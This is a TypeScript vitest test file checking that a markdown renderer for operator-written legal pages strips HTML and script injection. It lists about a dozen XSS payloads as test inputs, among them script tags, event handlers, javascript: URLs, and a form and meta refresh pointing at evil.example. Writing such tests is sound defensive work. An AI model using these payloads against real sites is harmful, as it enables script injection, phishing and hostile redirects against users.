import { describe, expect, it } from "vitest";
import { renderMarkdown } from "@/lib/legal/markdown";

/**
 * Custom document bodies are a larger surface than merge values.
 *
 * Previously an operator controlled short fields substituted into our template.
 * Now they write the entire document, and it is rendered onto a public page on
 * their own domain — which for a custom domain is a domain we serve.
 *
 * The renderer is escape-first, so this should hold. These prove it rather than
 * assume it, because the assumption is now carrying much more weight.
 */

const ALLOWED_TAGS = new Set([
  "h2", "p", "ul", "li", "strong", "table", "thead", "tbody", "tr", "th", "td",
]);

function disallowedTags(html: string): string[] {
  const tags = [...html.matchAll(/<\/?([a-z0-9]+)/gi)].map((m) => m[1].toLowerCase());
  return [...new Set(tags)].filter((tag) => !ALLOWED_TAGS.has(tag));
}

describe("an operator's own document body cannot introduce markup", () => {
  it.each([
    ["script tag", "<script>alert(1)</script>"],
    ["img onerror", '<img src=x onerror="alert(1)">'],
    ["iframe", "<iframe src='javascript:alert(1)'></iframe>"],
    ["svg onload", "<svg onload=alert(1)>"],
    ["anchor with javascript:", '<a href="javascript:alert(1)">click</a>'],
    ["style block", "<style>body{display:none}</style>"],
    ["form post", '<form action="https://evil.example"><input name="p"></form>'],
    ["object embed", '<object data="evil.swf"></object>'],
    ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
    ["event handler on allowed tag", '<p onclick="alert(1)">text</p>'],
  ])("neutralises %s", (_label, payload) => {
    const html = renderMarkdown(payload);
    expect(disallowedTags(html)).toEqual([]);
    expect(html).not.toContain(payload);
  });

  it("does not emit an anchor even from markdown link syntax", () => {
    // The renderer supports no link construct, so a link cannot smuggle a
    // javascript: URL through it.
    const html = renderMarkdown("[click](javascript:alert(1))");
    expect(disallowedTags(html)).toEqual([]);
    expect(html).not.toContain("<a");
  });

  it("keeps legitimate formatting working", () => {
    const html = renderMarkdown(
      "## Our Terms\n\nWe **do** deliver.\n\n- one\n- two",
    );
    expect(html).toContain("<h2>Our Terms</h2>");
    expect(html).toContain("<strong>do</strong>");
    expect(html).toContain("<li>one</li>");
    expect(disallowedTags(html)).toEqual([]);
  });

  it("handles a long document without emitting stray tags", () => {
    const long = Array.from(
      { length: 200 },
      (_, i) => `## Section ${i}\n\nText with <b>markup</b> and & ampersands.`,
    ).join("\n\n");
    expect(disallowedTags(renderMarkdown(long))).toEqual([]);
  });

  it("escapes an unterminated tag rather than swallowing the rest", () => {
    const html = renderMarkdown("Before <div and after");
    expect(html).toContain("Before");
    expect(html).toContain("after");
    expect(disallowedTags(html)).toEqual([]);
  });
});
